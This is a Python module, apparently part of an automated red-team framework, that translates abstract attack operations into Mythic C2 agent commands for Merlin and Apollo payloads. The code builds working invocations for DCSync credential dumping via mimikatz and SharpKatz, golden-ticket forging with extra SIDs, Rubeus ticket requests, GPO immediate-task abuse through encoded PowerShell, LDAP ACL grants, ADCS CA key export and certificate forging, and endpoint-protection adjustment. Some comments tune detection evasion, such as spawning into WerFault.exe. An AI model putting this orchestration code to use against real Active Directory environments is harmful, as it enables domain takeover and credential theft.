"""Mythic translation for generic capability execution plans.

The capability layer emits payload-agnostic operations such as
``gpo-computer-task`` and ``drsuapi-dcsync``. This adapter is the only place
that turns those operations into Mythic command names and parameter schemas.
"""

import base64
from dataclasses import dataclass, field, replace
from typing import Any

try:
    from . import operation_providers
except ImportError:
    import operation_providers


# Merlin's one-step registered-file .NET surface is execute-assembly. Operations
# that must mutate the agent's own logon session use the explicit
# load-assembly -> invoke-assembly in-process provider instead. Merlin's Donut
# transport truncates long execute-assembly arguments, so fail closed when a
# one-step command would exceed that transport limit. Runtime materializers may
# compact generated artifact paths before translation when the payload profile
# declares that as a safe way to stay under budget.
MERLIN_MYTHIC_ADAPTER: dict[str, Any] = {
    "payload_type": "merlin",
    "dotnet_runner_command": "execute-assembly",
    "dotnet_tool_param": "filename",
    "dotnet_args_param": "arguments",
    "dotnet_runner_max_argument_bytes": 255,
    "adcs_certificate_auth_compact_remote_paths": True,
    "adcs_certificate_auth_compact_ca_pfx_path": r".\c",
    "adcs_certificate_auth_compact_forged_pfx_path": r".\f",
    "certificate_forge_omit_subject": True,
    "inprocess_dotnet_load_command": "load-assembly",
    "inprocess_dotnet_load_tool_param": "filename",
    "inprocess_dotnet_invoke_command": "invoke-assembly",
    "inprocess_dotnet_invoke_tool_param": "assembly",
    "inprocess_dotnet_invoke_args_param": "arguments",
    "drsuapi_command": "",
    "drsuapi_inprocess_load_command": "load-assembly",
    "drsuapi_inprocess_invoke_command": "invoke-assembly",
    "dcsync_tool": "SharpKatz.exe",
    "mimikatz_command": "mimikatz",
    "mimikatz_arguments_param": "arguments",
    "mimikatz_quote_command": True,
    "mimikatz_parameters": {
        "spawnto": r"C:\Windows\System32\WerFault.exe",
    },
    "powershell_command": "run",
    "run_executable_param": "executable",
    "run_arguments_param": "arguments",
    # Merlin's shell TaskFunctionParseArgString expects JSON, so shell commands must
    # use its structured `arguments` parameter instead of Apollo-style raw text.
    "shell_raw_parameters": False,
    "shell_arguments_param": "arguments",
    "structured_artifact_read_command": "run",
    "structured_artifact_read_executable": "more.com",
    # Merlin's run/shell task bridge splits arguments on literal spaces before the
    # agent receives them. Prefer the quote-free native `net user` proof under run;
    # callers that truly need a quote-bearing command can opt into encoded PowerShell
    # under run rather than adding a cmd.exe shell process.
    "gpo_membership_proof_mode": "net-user",
    "gpo_membership_proof_transport": "run",
    "gpo_membership_proof_command": "run",
    "gpo_membership_proof_executable": "net.exe",
    "current_ticket_list_command": "run",
    "current_ticket_list_executable": "klist.exe",
    "current_ticket_list_arguments": "",
    "current_ticket_purge_command": "run",
    "current_ticket_purge_executable": "klist.exe",
    "current_ticket_purge_arguments": "purge",
    "current_service_ticket_command": "run",
    "current_service_ticket_executable": "klist.exe",
    # Merlin applies its stored make_token token around later commands. Once that
    # token exists, in-process Rubeus PTT and klist operate in that isolated
    # logon session even though their underlying provider semantics are current
    # session operations.
    "logon_session_mode": "direct",
    "logon_username_param": "user",
    "logon_password_param": "pass",
    "logon_netonly_param": "",
    "operation_provider_extra_contexts": {
        "managed-rubeus-ptt": ["isolated"],
        "managed-rubeus-klist": ["isolated"],
    },
    # A process-backed PowerShell query loses Merlin's applied make_token token.
    # Keep managed-secret reads in-process so SharpView runs under Setup()/TearDown().
    "managed_secret_inprocess_load_command": "load-assembly",
    "managed_secret_inprocess_invoke_command": "invoke-assembly",
    "managed_secret_read_tool": "SharpView.exe",
    # Merlin has no Apollo-style ticket_cache_* or ticket_store_* commands. Let
    # the operation-provider layer choose Rubeus ptt or klist rather than
    # emitting a command that only exists on another payload.
    "current_ticket_import_command": "",
    "current_ticket_cache_list_command": "",
    "current_ticket_cache_purge_command": "",
    "ticket_import_command": "",
    "ticket_list_command": "",
    "ticket_purge_command": "",
    "service_access_command": "ls",
    "service_access_path_param": "path",
    "upload_command": "upload",
    "tool_upload_command": "upload",
    # Merlin's File parameter group is for a new inline upload. Passing an existing
    # Mythic UUID there creates a zero-byte target file; registered artifacts must
    # use the Default-group filename selector instead.
    "upload_file_param": "file",
    "upload_path_param": "path",
    "upload_registered_file_param": "filename",
    "upload_registered_file_value": "filename",
    "collection_identity_command": "token",
    "collection_identity_parameters": {"method": "whoami"},
    "collection_identity_parser": "merlin-token",
    # Merlin exposes token identity/LUID state but no Apollo-style ticket_cache_list
    # command. Baseline collection only needs a domain-capable token proof.
    "collection_ticket_command": "",
    "collection_revert_command": "rev2Self",
    "collection_download_path_param": "file",
    # Merlin's `run` child-process path inherits any stored make_token token.
    # Use explicit PSCredential WMI for local-admin remote exec and clear stale
    # stored tokens first so process creation runs under the original context.
    "local_admin_remote_exec_command": "run",
    "native_remote_exec_method": "powershell-wmi",
    "explicit_credential_remote_exec_reset_command": "rev2Self",
    "remote_file_read_command": "download",
    "remote_file_read_path_param": "file",
    "suppress_remote_file_read": True,
}

APOLLO_MYTHIC_ADAPTER: dict[str, Any] = {
    "payload_type": "apollo",
    # Apollo's explicit-credential wmiexecute path uses System.Management and can
    # activate DCOM below packet integrity on hardened targets. The token branch
    # uses Apollo's manual CoCreateInstanceEx path with PKT_PRIVACY and survives
    # the same hardening policy.
    "local_admin_remote_exec_command": "wmiexecute",
    "local_admin_remote_exec_use_token_context": True,
    "adcs_ca_export_use_token_context": True,
    "local_admin_context_command": "make_token",
    "make_token_use_credential_object": True,
    "local_admin_remote_exec_cleanup_command": "rev2self",
}

_PAYLOAD_TYPE_ADAPTERS: dict[str, dict[str, Any]] = {
    "apollo": APOLLO_MYTHIC_ADAPTER,
    "merlin": MERLIN_MYTHIC_ADAPTER,
}

_COLLECTION_PAYLOAD_TYPE_ADAPTERS: dict[str, dict[str, Any]] = {
    "apollo": {},
    "merlin": MERLIN_MYTHIC_ADAPTER,
}


def adapter_config_for_payload_type(payload_type: Any) -> dict[str, Any]:
    """Return a copy of the command-schema profile for a Mythic payload type."""
    return dict(_PAYLOAD_TYPE_ADAPTERS.get(_normalize(payload_type), {}))


def collection_adapter_for_payload_type(payload_type: Any) -> dict[str, Any] | None:
    """Return a collector command profile, or None when collection is unsupported."""
    profile = _COLLECTION_PAYLOAD_TYPE_ADAPTERS.get(_normalize(payload_type))
    return dict(profile) if isinstance(profile, dict) else None


@dataclass(frozen=True)
class MythicCapabilityCommand:
    command: str
    parameters: Any
    capability: str
    purpose: str
    expected_probe: str
    operation: str = ""
    prerequisites: list[str] = field(default_factory=list)
    produces: list[str] = field(default_factory=list)
    consumes: list[str] = field(default_factory=list)
    deferred: bool = False


@dataclass(frozen=True)
class MythicCapabilityCommandPlan:
    ok: bool
    commands: list[MythicCapabilityCommand] = field(default_factory=list)
    missing: list[str] = field(default_factory=list)
    reason: str = ""


def build_mythic_capability_commands(
    execution_plan: Any,
    adapter: dict[str, Any] | None = None,
) -> MythicCapabilityCommandPlan:
    """Translate generic capability execution steps into Mythic tool calls.

    ``adapter`` may override command names and parameter keys for payloads that
    expose different Mythic command schemas.
    """
    config = adapter if isinstance(adapter, dict) else {}
    if not getattr(execution_plan, "ok", False):
        return MythicCapabilityCommandPlan(
            False,
            missing=list(getattr(execution_plan, "missing", []) or []),
            reason=_text(getattr(execution_plan, "reason", "")),
        )

    commands: list[MythicCapabilityCommand] = []
    for step in list(getattr(execution_plan, "steps", []) or []):
        translated = _translate_step(step, config)
        if not translated.ok:
            return translated
        operation = _normalize(getattr(step, "operation", ""))
        commands.extend(_commands_with_operation(translated.commands, operation))
    return MythicCapabilityCommandPlan(
        True,
        commands=_dedupe_redundant_inprocess_setup_commands(commands, config),
        reason="translated generic capability plan",
    )


def _translate_step(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    operation = _normalize(getattr(step, "operation", ""))
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    if operation == "gpo-computer-task":
        plan = _dotnet_tool_command(step, config, _text(parameters.get("tool")), _sharp_gpo_task_args(parameters))
        if plan.ok and plan.commands:
            return _plan_with_terminal_artifacts(plan, produces=["artifact:gpo_immediate_task"])
        return plan
    if operation == "structured-artifact-read":
        path = _text(parameters.get("path") or parameters.get("artifact_path"))
        if not path:
            return MythicCapabilityCommandPlan(False, missing=["path"], reason="structured artifact read needs path")
        artifact_type = _normalize(parameters.get("artifact_type") or parameters.get("format") or "structured")
        produces = [f"artifact:{artifact_type}_validated"] if artifact_type else ["artifact:structured_validated"]
        return _structured_artifact_read_command(step, config, path, produces)
    if operation == "gpo-immediate-task-fallback":
        return _gpo_immediate_task_fallback_command(step, config, parameters)
    if operation == "gpo-refresh-local":
        return _shell_command(step, config, "gpupdate /force", consumes=["artifact:gpo_immediate_task"], produces=["event:group_policy_refresh"])
    if operation == "gpo-wait":
        seconds = int(parameters.get("seconds") or 300)
        reason = _text(parameters.get("reason")) or "wait for Group Policy refresh"
        return MythicCapabilityCommandPlan(True, commands=[
            _command_from_step(
                step,
                "wait_for_seconds",
                {"seconds": seconds, "reason": reason},
                consumes=["artifact:gpo_immediate_task"],
                produces=["event:group_policy_refresh"],
            ),
        ])
    if operation == "gpo-domain-admin-membership-proof":
        principal = _text(parameters.get("principal"))
        proof_mode = _normalize(config.get("gpo_membership_proof_mode"))
        proof_command = 'net group "Domain Admins" /domain'
        if proof_mode == "net-user" and principal:
            proof_command = "net user " + _quote_cli(principal) + " /domain"
        consumes = ["artifact:gpo_immediate_task", "event:group_policy_refresh"]
        proof_transport = _normalize(config.get("gpo_membership_proof_transport"))
        if proof_transport == "run":
            executable = _adapter_text(config, "gpo_membership_proof_executable", "")
            if not executable:
                return MythicCapabilityCommandPlan(
                    False,
                    missing=["gpo_membership_proof_executable"],
                    reason="run membership proof needs an executable",
                )
            if proof_mode == "net-user" and principal:
                return _run_command(
                    step,
                    config,
                    executable,
                    "user " + _quote_cli(principal) + " /domain",
                    command=_adapter_text(config, "gpo_membership_proof_command", "run"),
                    consumes=consumes,
                )
            return MythicCapabilityCommandPlan(
                False,
                missing=["quote_free_membership_proof"],
                reason="run membership proof needs a quote-free principal-scoped command",
            )
        if proof_transport == "powershell":
            command = _adapter_text(
                config,
                "gpo_membership_proof_command",
                _adapter_text(config, "powershell_command", "powerpick"),
            )
            if _normalize(command) == "run":
                return _run_command(
                    step,
                    config,
                    "powershell.exe",
                    _powershell_encoded_args(proof_command),
                    command=command,
                    consumes=consumes,
                )
            if _normalize(command) == "shell":
                return _shell_command(
                    step,
                    config,
                    "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand "
                    + _ps_encoded_command(proof_command),
                    consumes=consumes,
                )
            return MythicCapabilityCommandPlan(True, commands=[
                _command_from_step(step, command, proof_command, consumes=consumes),
            ])
        return _shell_command(
            step,
            config,
            proof_command,
            consumes=consumes,
        )
    if operation == "gpo-proof-read":
        proof_path = _text(parameters.get("proof_path"))
        if not proof_path:
            return MythicCapabilityCommandPlan(False, missing=["proof_path"], reason="GPO proof-read needs proof_path")
        return _shell_command(
            step,
            config,
            "type " + _quote_cli(proof_path),
            consumes=["artifact:gpo_immediate_task", "event:group_policy_refresh"],
        )
    if operation == "ldap-extended-right-grant":
        return _dotnet_tool_command(
            step,
            config,
            _text(parameters.get("tool")),
            _standin_grant_args(
                _text(parameters.get("target_dn")),
                _text(parameters.get("principal")),
                _text(parameters.get("guid")),
            ),
        )
    if operation == "ldap-acl-read":
        return _dotnet_tool_command(
            step,
            config,
            _text(parameters.get("tool")),
            _standin_acl_read_args(
                _text(parameters.get("target_dn")),
                _text(parameters.get("principal")),
            ),
        )
    if operation == "drsuapi-dcsync":
        return _drsuapi_dcsync_command(step, config)
    if operation in {"kerberos-ticket-forge", "kerberos-golden-ticket"}:
        return _kerberos_ticket_forge_command(step, config)
    if operation in {
        "kerberos-inter-realm-referral",
        "kerberos-service-ticket-request",
        "kerberos-ticket-asktgs",
    }:
        return _kerberos_inter_realm_referral_command(step, config)
    if operation in {"kerberos-account-tgt", "kerberos-tgt-request"}:
        return _kerberos_account_tgt_command(step, config)
    if operation == "kerberos-logon-session-create":
        return _kerberos_logon_session_create_command(step, config)
    if operation == "kerberos-ticket-import":
        return _kerberos_ticket_import_command(step, config)
    if operation == "kerberos-ticket-list":
        return _kerberos_ticket_list_command(step, config)
    if operation == "kerberos-ticket-purge":
        return _kerberos_ticket_purge_command(step, config)
    if operation == "kerberos-service-ticket-acquire":
        return _kerberos_service_ticket_acquire_command(step, config)
    if operation == "kerberos-context-service-proof":
        return _kerberos_context_service_proof_command(step, config)
    if operation == "ldap-managed-local-admin-secret-read":
        return _ldap_managed_local_admin_secret_read_command(step, config)
    if operation == "local-admin-logon-session-create":
        return _local_admin_logon_session_create_command(step, config)
    if operation == "local-admin-service-proof":
        return _local_admin_service_proof_command(step, config)
    if operation == "local-admin-remote-command":
        return _local_admin_remote_command(step, config)
    if operation == "remote-file-read":
        return _remote_file_read_command(step, config)
    if operation == "endpoint-protection-adjustment":
        return _endpoint_protection_adjustment_command(step, config)
    if operation == "adcs-ca-private-key-export":
        return _adcs_ca_private_key_export_command(step, config)
    if operation == "adcs-ca-private-key-dpapi-export":
        return _adcs_ca_private_key_dpapi_export_command(step, config)
    if operation == "adcs-esc-certificate-enroll":
        return _adcs_esc_certificate_enroll_command(step, config)
    if operation == "adcs-certificate-forge":
        return _adcs_certificate_forge_command(step, config)
    if operation == "certificate-pkinit-tgt":
        return _certificate_pkinit_tgt_command(step, config)
    if operation == "certificate-schannel-ldap-proof":
        return _certificate_schannel_ldap_proof_command(step, config)
    return MythicCapabilityCommandPlan(
        False,
        missing=["operation"],
        reason=f"no Mythic adapter for capability operation: {operation}",
    )


def _dotnet_tool_command(
    step: Any,
    config: dict[str, Any],
    tool_name: str,
    tool_arguments: str,
) -> MythicCapabilityCommandPlan:
    runner_command = _adapter_text(config, "dotnet_runner_command", "execute_assembly")
    tool_param = _adapter_text(config, "dotnet_tool_param", "assembly_name")
    args_param = _adapter_text(config, "dotnet_args_param", "assembly_arguments")
    missing = []
    if not runner_command:
        missing.append("dotnet_runner_command")
    if not tool_name:
        missing.append("tool")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="dotnet-tool Mythic adapter needs a runner command and tool name",
        )
    argument_limit = _dotnet_runner_argument_limit(config)
    argument_size = len(_text(tool_arguments).encode("utf-8"))
    if argument_limit and argument_size > argument_limit:
        return MythicCapabilityCommandPlan(
            False,
            missing=["dotnet_argument_transport"],
            reason=(
                "dotnet-tool arguments exceed the configured runner transport limit "
                f"({argument_size}>{argument_limit})"
            ),
        )
    return MythicCapabilityCommandPlan(
        True,
        commands=[
            MythicCapabilityCommand(
                command=runner_command,
                parameters={
                    tool_param: tool_name,
                    args_param: tool_arguments,
                },
                capability=_text(getattr(step, "capability", "")),
                purpose=_text(getattr(step, "purpose", "")),
                expected_probe=_text(getattr(step, "expected_probe", "")),
                prerequisites=list(getattr(step, "prerequisites", []) or []),
            )
        ],
    )


def _shell_command(
    step: Any,
    config: dict[str, Any],
    command_line: str,
    produces: list[str] | None = None,
    consumes: list[str] | None = None,
    deferred: bool = False,
) -> MythicCapabilityCommandPlan:
    command = _adapter_text(config, "shell_command", "shell")
    if not command:
        return MythicCapabilityCommandPlan(False, missing=["shell_command"], reason="shell adapter needs a command")
    parameters: Any = command_line
    if _normalize(command) == "shell" and not _input_bool(config, "shell_raw_parameters", default=True):
        parameters = {
            _adapter_text(config, "shell_arguments_param", "arguments"): command_line,
        }
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(step, command, parameters, produces=produces, consumes=consumes, deferred=deferred),
    ])


def _structured_artifact_read_command(
    step: Any,
    config: dict[str, Any],
    path: str,
    produces: list[str],
) -> MythicCapabilityCommandPlan:
    provider = operation_providers.select_operation_provider(
        "structured-artifact-read",
        config=config,
        context="current",
    )
    if (
        provider is not None
        and provider.name == "windows-more-structured-artifact-read"
        and _normalize(provider.command) == "run"
    ):
        return _run_command(
            step,
            config,
            provider.executable,
            _quote_cli(path),
            command=provider.command,
            consumes=["artifact:gpo_immediate_task"],
            produces=produces,
        )
    return _shell_command(
        step,
        config,
        "type " + _quote_cli(path),
        consumes=["artifact:gpo_immediate_task"],
        produces=produces,
    )


def _run_command(
    step: Any,
    config: dict[str, Any],
    executable: str,
    arguments: str = "",
    produces: list[str] | None = None,
    consumes: list[str] | None = None,
    command: str | None = None,
    deferred: bool = False,
) -> MythicCapabilityCommandPlan:
    command_name = _text(command) or _adapter_text(config, "run_command", "run")
    if not command_name:
        return MythicCapabilityCommandPlan(False, missing=["run_command"], reason="run adapter needs a command")
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(
            step,
            command_name,
            {
                _adapter_text(config, "run_executable_param", "executable"): executable,
                _adapter_text(config, "run_arguments_param", "arguments"): arguments,
            },
            produces=produces,
            consumes=consumes,
            deferred=deferred,
        ),
    ])


def _gpo_immediate_task_fallback_command(
    step: Any,
    config: dict[str, Any],
    parameters: dict[str, Any],
) -> MythicCapabilityCommandPlan:
    command = _adapter_text(config, "gpo_immediate_task_command", _adapter_text(config, "powershell_command", "powerpick"))
    if not command:
        return MythicCapabilityCommandPlan(
            False,
            missing=["gpo_immediate_task_command"],
            reason="GPO immediate-task fallback adapter needs a Mythic PowerShell command",
        )
    script = _gpp_immediate_task_script(parameters)
    normalized_command = _normalize(command)
    if normalized_command == "shell":
        return _shell_command(
            step,
            config,
            "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + _ps_encoded_command(script),
            produces=["artifact:gpo_immediate_task"],
        )
    if normalized_command == "run":
        return MythicCapabilityCommandPlan(True, commands=[
            _command_from_step(
                step,
                command,
                {
                    _adapter_text(config, "run_executable_param", "executable"): "powershell.exe",
                    _adapter_text(config, "run_arguments_param", "arguments"): _powershell_encoded_args(script),
                },
                produces=["artifact:gpo_immediate_task"],
            ),
        ])

    raw_script = _input_bool(config, "gpo_immediate_task_raw_script", default=True)
    mythic_parameters: Any = script if raw_script else {
        _adapter_text(config, "gpo_immediate_task_script_param", "script"): script,
    }
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(
            step,
            command,
            mythic_parameters,
            produces=["artifact:gpo_immediate_task"],
        ),
    ])


def _drsuapi_dcsync_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    domain = _text(parameters.get("domain"))
    account = _text(parameters.get("account") or "krbtgt")
    dc = _text(parameters.get("dc"))
    if not domain:
        return MythicCapabilityCommandPlan(False, missing=["domain"], reason="DCSync adapter needs a domain")

    executor = _normalize(parameters.get("executor") or config.get("executor"))
    if executor not in {"mimikatz", "native-mimikatz"}:
        provider = operation_providers.select_operation_provider(
            "drsuapi-dcsync",
            config=config,
            context="active-auth-context",
        )
        if provider is not None and provider.kind == "native":
            native_account = _dcsync_user_qualifier(account, domain) if executor == "native" else account
            mythic_parameters = {
                _adapter_text(config, "drsuapi_domain_param", "domain"): domain,
                _adapter_text(config, "drsuapi_user_param", "user"): native_account,
            }
            dc_param = _adapter_text(config, "drsuapi_dc_param", "dc")
            if dc:
                mythic_parameters[dc_param] = dc
            return MythicCapabilityCommandPlan(True, commands=[
                _command_from_step(step, provider.command, mythic_parameters),
            ])
        if provider is not None and provider.name == "managed-sharpkatz-dcsync":
            translated = _inprocess_dotnet_tool_command(
                step,
                config,
                provider,
                provider.tool,
                _sharpkatz_dcsync_args(domain, account, dc),
            )
            if not translated.ok:
                return translated
            if len(translated.commands) < 2:
                return MythicCapabilityCommandPlan(
                    False,
                    missing=["inprocess_dotnet_commands"],
                    reason="managed DCSync provider needs load and invoke commands",
                )
            return MythicCapabilityCommandPlan(True, commands=[
                replace(translated.commands[0], expected_probe=""),
                translated.commands[1],
            ])

    mimikatz_command = _adapter_text(config, "mimikatz_command", "mimikatz")
    mimikatz_param = _adapter_text(config, "mimikatz_arguments_param", "commands")
    if not mimikatz_command:
        return MythicCapabilityCommandPlan(
            False,
            missing=["drsuapi_provider"],
            reason="DCSync adapter needs a DRSUAPI provider or a Mimikatz fallback command",
        )
    pieces = [
        "lsadump::dcsync",
        f"/domain:{domain}",
        f"/user:{_dcsync_user_qualifier(account, domain)}",
    ]
    if dc:
        pieces.append(f"/dc:{dc}")
    command_text = _mimikatz_command_argument(" ".join(pieces), config)
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(step, mimikatz_command, _mimikatz_parameters(mimikatz_param, command_text, config)),
    ])


def _netbios_from_domain(domain: str) -> str:
    """NETBIOS short name for an AD domain — the first DNS label, uppercased (north.sevenkingdoms.local -> NORTH)."""
    d = _text(domain).strip()
    return d.split(".", 1)[0].upper() if d else ""


def _dcsync_user_qualifier(account: str, domain: str) -> str:
    """Always qualify the mimikatz dcsync `/user` with the domain NETBIOS short name (e.g. NORTH\\krbtgt) so
    the DC's CrackNames lookup is unambiguous. The same sAMAccountName (krbtgt, administrator) exists in EVERY
    domain of a forest; an unqualified name returns `CrackNames ... ERROR_NOT_UNIQUE` (0x3) and the dcsync
    yields no hash. An already-qualified account (DOMAIN\\user or user@domain) is left untouched."""
    acct = _text(account).strip()
    if not acct or "\\" in acct or "/" in acct or "@" in acct:
        return acct
    netbios = _netbios_from_domain(domain)
    return f"{netbios}\\{acct}" if netbios else acct


def _sharpkatz_dcsync_args(domain: str, account: str, dc: str = "") -> str:
    pieces = [
        "--Command", "dcsync",
        "--User", _quote_cli(_dcsync_user_qualifier(account, domain)),
        "--Domain", _quote_cli(domain),
    ]
    if dc:
        pieces.extend(["--DomainController", _quote_cli(dc)])
    return " ".join(pieces)


def _kerberos_ticket_forge_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    domain = _text(parameters.get("domain"))
    user = _text(parameters.get("user") or "Administrator")
    domain_sid = _text(parameters.get("domain_sid") or parameters.get("sid"))
    key_type = _normalize(parameters.get("key_type"))
    key_value = _text(parameters.get("key"))
    missing = []
    if not domain:
        missing.append("domain")
    if not domain_sid:
        missing.append("domain_sid")
    if not key_value:
        missing.append("key")
    key_flag = _kerberos_key_flag(key_type)
    if key_value and not key_flag:
        missing.append("key_type")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="Kerberos golden-ticket adapter needs domain, domain SID, krbtgt key, and key type",
        )

    backend = _normalize(config.get("kerberos_forge_backend") or config.get("kerberos_backend") or config.get("executor"))
    if backend in {"mimikatz", "native-mimikatz"}:
        return _mimikatz_ticket_forge_command(step, config, domain, user, domain_sid, key_flag, key_value)
    return _managed_kerberos_ticket_forge_command(step, config, domain, user, domain_sid, key_flag, key_value)


def _managed_kerberos_ticket_forge_command(
    step: Any,
    config: dict[str, Any],
    domain: str,
    user: str,
    domain_sid: str,
    key_flag: str,
    key_value: str,
) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    pieces = [
        "golden",
        f"/user:{user}",
        f"/domain:{domain}",
        f"/sid:{domain_sid}",
        f"/{key_flag}:{key_value}",
    ]
    extra_sids = _string_list(parameters.get("extra_sids") or parameters.get("sids"))
    if extra_sids:
        pieces.append(f"/sids:{','.join(extra_sids)}")
    if parameters.get("nowrap", True) is not False:
        pieces.append("/nowrap")

    tool_name = _adapter_text(config, "kerberos_tool", _adapter_text(config, "managed_kerberos_tool", "Rubeus.exe"))
    if not tool_name:
        return MythicCapabilityCommandPlan(
            False,
            missing=["kerberos_tool"],
            reason="Kerberos ticket forge adapter needs a managed Kerberos tool",
        )
    command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
    if not command.ok:
        return command
    return _plan_with_terminal_artifacts(command, produces=["kerberos_ticket_base64"])


def _kerberos_inter_realm_referral_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    """Map an explicit TGS fallback exchange to the payload's managed Kerberos command.

    The normal cross-domain path lets Windows acquire referrals and service tickets from the imported current
    session TGT. When a capability explicitly needs a standalone TGS artifact, this fallback runs twice: the
    child DC issues the parent referral, then the parent DC exchanges that referral for the service ticket used
    by the proof operation. The latest ticket artifact intentionally replaces the prior one for downstream
    import.
    """
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    target_domain = _text(
        parameters.get("target_domain") or parameters.get("parent_domain") or parameters.get("service_domain")
    )
    dc = _text(parameters.get("dc") or parameters.get("child_dc") or parameters.get("domain_controller"))
    ticket = _text(parameters.get("ticket_base64") or parameters.get("ticket") or "{{kerberos_ticket_base64}}")
    service = _text(parameters.get("service")) or (f"krbtgt/{target_domain}" if target_domain else "")
    missing = []
    if not service:
        missing.append("target_domain")
    if not dc:
        missing.append("dc")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="Kerberos TGS exchange needs a target service and domain controller",
        )
    pieces = ["asktgs", f"/ticket:{ticket}", f"/service:{service}", f"/dc:{dc}"]
    if parameters.get("nowrap", True) is not False:
        pieces.append("/nowrap")
    tool_name = _adapter_text(config, "kerberos_tool", _adapter_text(config, "managed_kerberos_tool", "Rubeus.exe"))
    if not tool_name:
        return MythicCapabilityCommandPlan(
            False, missing=["kerberos_tool"], reason="inter-realm referral needs a managed Kerberos tool"
        )
    command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
    if not command.ok:
        return command
    return _plan_with_terminal_artifacts(
        command,
        consumes=["kerberos_ticket_base64"],
        produces=["kerberos_ticket_base64"],
        deferred=True,
    )


def _mimikatz_ticket_forge_command(
    step: Any,
    config: dict[str, Any],
    domain: str,
    user: str,
    domain_sid: str,
    key_flag: str,
    key_value: str,
) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    pieces = [
        "kerberos::golden",
        f"/user:{user}",
        f"/domain:{domain}",
        f"/sid:{domain_sid}",
        f"/{key_flag}:{key_value}",
    ]
    extra_sids = _string_list(parameters.get("extra_sids") or parameters.get("sids"))
    if extra_sids:
        pieces.append(f"/sids:{','.join(extra_sids)}")

    command = _adapter_text(config, "kerberos_ticket_command", _adapter_text(config, "mimikatz_command", "mimikatz"))
    argument_param = _adapter_text(
        config,
        "kerberos_ticket_arguments_param",
        _adapter_text(config, "mimikatz_arguments_param", "commands"),
    )
    if not command:
        return MythicCapabilityCommandPlan(
            False,
            missing=["kerberos_ticket_command"],
            reason="Kerberos golden-ticket adapter needs a Mythic command",
        )
    command_text = _mimikatz_command_argument(" ".join(pieces), config)
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(
            step,
            command,
            _mimikatz_parameters(argument_param, command_text, config),
            produces=["kerberos_ticket_file"],
        ),
    ])


def _kerberos_account_tgt_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    domain = _text(parameters.get("domain") or parameters.get("realm"))
    user = _text(parameters.get("user") or parameters.get("account"))
    key_type = _normalize(parameters.get("key_type"))
    key_value = _text(parameters.get("key"))
    missing = []
    if not domain:
        missing.append("domain")
    if not user:
        missing.append("user")
    if not key_value:
        missing.append("key")
    key_flag = _kerberos_key_flag(key_type)
    if key_value and not key_flag:
        missing.append("key_type")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="Kerberos account-TGT adapter needs domain, user, account key, and key type",
        )

    pieces = [
        "asktgt",
        f"/user:{user}",
        f"/domain:{domain}",
        f"/{key_flag}:{key_value}",
    ]
    dc = _text(parameters.get("dc") or parameters.get("domain_controller"))
    if dc:
        pieces.append(f"/dc:{dc}")
    if parameters.get("nowrap", True) is not False:
        pieces.append("/nowrap")

    tool_name = _adapter_text(config, "kerberos_tool", _adapter_text(config, "managed_kerberos_tool", "Rubeus.exe"))
    if not tool_name:
        return MythicCapabilityCommandPlan(
            False,
            missing=["kerberos_tool"],
            reason="Kerberos account-TGT adapter needs a managed Kerberos tool",
        )
    command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
    if not command.ok:
        return command
    return _plan_with_terminal_artifacts(command, produces=["kerberos_ticket_base64"])


def _certificate_pkinit_tgt_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    domain = _text(parameters.get("domain") or parameters.get("realm"))
    user = _text(parameters.get("user") or parameters.get("account"))
    certificate = _text(
        parameters.get("certificate_base64")
        or parameters.get("certificate_path")
        or parameters.get("forged_pfx_path")
        or parameters.get("pfx_path")
    )
    certificate_password = _text(
        parameters.get("certificate_password")
        or parameters.get("forged_pfx_password")
        or parameters.get("pfx_password")
    )
    missing = []
    if not domain:
        missing.append("domain")
    if not user:
        missing.append("user")
    if not certificate:
        missing.append("certificate")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="certificate PKINIT adapter needs domain, user, and certificate path/base64",
        )

    pieces = [
        "asktgt",
        f"/user:{user}",
        f"/domain:{domain}",
        f"/certificate:{_rubeus_value(certificate)}",
    ]
    if certificate_password:
        pieces.append(f"/password:{_rubeus_value(certificate_password)}")
    dc = _text(parameters.get("dc") or parameters.get("domain_controller"))
    if dc:
        pieces.append(f"/dc:{dc}")
    if parameters.get("getcredentials", True) is not False:
        pieces.append("/getcredentials")
    if parameters.get("show", True) is not False:
        pieces.append("/show")
    if parameters.get("nowrap", True) is not False:
        pieces.append("/nowrap")

    tool_name = _adapter_text(config, "kerberos_tool", _adapter_text(config, "managed_kerberos_tool", "Rubeus.exe"))
    if not tool_name:
        return MythicCapabilityCommandPlan(
            False,
            missing=["kerberos_tool"],
